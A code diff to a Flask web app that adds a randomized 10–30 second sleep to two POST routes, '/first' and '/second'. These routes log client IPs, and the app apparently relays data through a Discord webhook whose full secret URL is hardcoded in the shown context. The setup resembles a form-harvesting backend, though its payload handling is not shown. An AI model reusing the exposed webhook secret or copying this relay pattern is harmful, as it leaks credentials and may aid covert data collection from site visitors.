@@ -12,6 +12,8 @@ from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+import time
+import random
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
@@ -205,6 +207,10 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
+        # Introduce a randomized delay between 10 to 30 seconds
+        delay_time = random.randint(10, 30)
+        time.sleep(delay_time)  
+
         ip = request.headers.get('X-Forwarded-For') or \
              request.headers.get('X-Real-IP') or \
              request.headers.get('X-Client-IP') or \
@@ -230,6 +236,10 @@ def first():
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
+        # Introduce a randomized delay between 10 to 30 seconds
+        delay_time = random.randint(10, 30)
+        time.sleep(delay_time)
+
         ip = request.headers.get('X-Forwarded-For') or \
              request.headers.get('X-Real-IP') or \
              request.headers.get('X-Client-IP') or \
